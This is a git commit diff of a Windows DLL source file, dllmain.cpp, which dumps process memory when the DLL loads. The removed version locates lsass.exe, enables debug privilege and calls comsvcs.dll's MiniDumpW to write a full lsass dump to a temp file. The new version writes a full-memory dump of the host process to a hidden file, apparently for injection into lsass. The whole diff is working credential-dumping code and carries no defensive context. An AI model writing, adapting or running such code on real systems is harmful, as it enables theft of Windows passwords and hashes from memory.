6231f10b1b2089efecbba1818487a0d0c0ab76f3
whyjoezk <58034833+whyjoezk@users.noreply.github.com>
2021-09-09 15:44:50 +0800

    Update dllmain.cpp

--- Dll1/Dll1/dllmain.cpp
+++ Dll1/Dll1/dllmain.cpp
@@ -1,83 +1,80 @@
-﻿#include <cstdio>
 #include <windows.h>
-#include <DbgHelp.h>
 #include <iostream>
-#include <TlHelp32.h>
-#include <string>  
-#include <map>  
-#include <windows.h>
-#pragma comment(lib,"Dbghelp.lib")
+#include <process.h>
+#include <Dbghelp.h>
+//#pragma comment(lib, "dbghelp")
 using namespace std;
 
-int FindPID()
+typedef HRESULT(WINAPI* _MiniDumpWriteDump)(
+    HANDLE                            hProcess,
+    DWORD                             ProcessId,
+    HANDLE                            hFile,
+    MINIDUMP_TYPE                     DumpType,
+    PMINIDUMP_EXCEPTION_INFORMATION   ExceptionParam,
+    PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
+    PMINIDUMP_CALLBACK_INFORMATION    CallbackParam
+    );
+HANDLE OpenFileHandle(LPCTSTR FileName)
 {
-    PROCESSENTRY32 pe32;
-    pe32.dwSize = sizeof(pe32);
+    HANDLE FileHandle;
 
-    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hProcessSnap == INVALID_HANDLE_VALUE) {
-        cout << "CreateToolhelp32Snapshot Error!" << endl;;
-        return -1;
-    }
-
-    BOOL bResult = Process32First(hProcessSnap, &pe32);
-
-    while (bResult)
+    FileHandle = CreateFile(
+        FileName,
+        GENERIC_READ | GENERIC_WRITE,
+        0,
+        NULL,
+        CREATE_ALWAYS,
+        FILE_ATTRIBUTE_HIDDEN,
+        NULL
+    );
+    if (FileHandle == INVALID_HANDLE_VALUE)
     {
-        if (_wcsicmp(pe32.szExeFile, L"lsass.exe") == 0)
-        {
-            return pe32.th32ProcessID;
-        }
-        bResult = Process32Next(hProcessSnap, &pe32);
+        std::cout << "Failed to get file handle" << std::endl;
+        std::cout << GetLastError() << std::endl;
     }
 
-    CloseHandle(hProcessSnap);
-
-    return -1;
+    return FileHandle;
 }
-typedef HRESULT(WINAPI* _MiniDumpW)(
-    DWORD arg1, DWORD arg2, PWCHAR cmdline);
 
-typedef NTSTATUS(WINAPI* _RtlAdjustPrivilege)(
-    ULONG Privilege, BOOL Enable,
-    BOOL CurrentThread, PULONG Enabled);
+//bool MiniDumpProc(DWORD procid, LPCTSTR FileName)
+bool MiniDumpProc()
+{
+    DWORD procid = (DWORD)_getpid();
+    LPCTSTR FileName = L"C:\\windows\\temp\\1.bin";
+    HANDLE FileHandle;
+    HANDLE ProcHandle;
+    _MiniDumpWriteDump MiniDumpWriteDump;
 
-int dump() {
-    HRESULT             hr;
-    _MiniDumpW          MiniDumpW;
-    _RtlAdjustPrivilege RtlAdjustPrivilege;
-    ULONG               t;
-
-    MiniDumpW = (_MiniDumpW)GetProcAddress(
-        LoadLibrary(L"comsvcs.dll"), "MiniDumpW");
-
-    RtlAdjustPrivilege = (_RtlAdjustPrivilege)GetProcAddress(
-        GetModuleHandle(L"ntdll"), "RtlAdjustPrivilege");
-
-    if (MiniDumpW == NULL) {
-
-        return 0;
+    // Get a file handle
+    FileHandle = OpenFileHandle(FileName);
+    // Get a proc handle 
+    ProcHandle = GetCurrentProcess();
+    MiniDumpWriteDump = (_MiniDumpWriteDump)GetProcAddress(
+        LoadLibrary(L"Dbghelp.dll"), "MiniDumpWriteDump");
+    https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump
+    if (!MiniDumpWriteDump(
+        ProcHandle,
+        procid,
+        FileHandle,
+        MiniDumpWithFullMemory,
+        NULL,
+        NULL,
+        NULL
+    ))
+    {
+        std::cout << GetLastError() << std::endl;
+        return FALSE;
     }
-    // try enable debug privilege
-    RtlAdjustPrivilege(20, TRUE, FALSE, &t);
-    int pid = FindPID();
-    if (pid > 0) {
-        wchar_t  ws[100];
-        //swprintf(ws, 100, L"%hs", "1008 C:\\windows\\temp\\1.bin full"); //784是lsass进程的pid号  "<pid> <dump.bin> full" 
-        //swprintf(ws, 100, L"%d %hs",488,"c:\\windows\\temp\\1.bin full");
-        swprintf(ws, 100, L"%d %hs", pid, "c:\\windows\\temp\\1.bin full");
-        MiniDumpW(0, 0, ws);
-        return 0;
-    }
-    return -1;
-
+    CloseHandle(FileHandle);
+    CloseHandle(ProcHandle);
+    return TRUE;
 }
+
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
-    //dump();
     try {
         switch (ul_reason_for_call) {
         case DLL_PROCESS_ATTACH:
-            dump();
+            MiniDumpProc();
             break;
         case DLL_THREAD_ATTACH:
         case DLL_THREAD_DETACH:
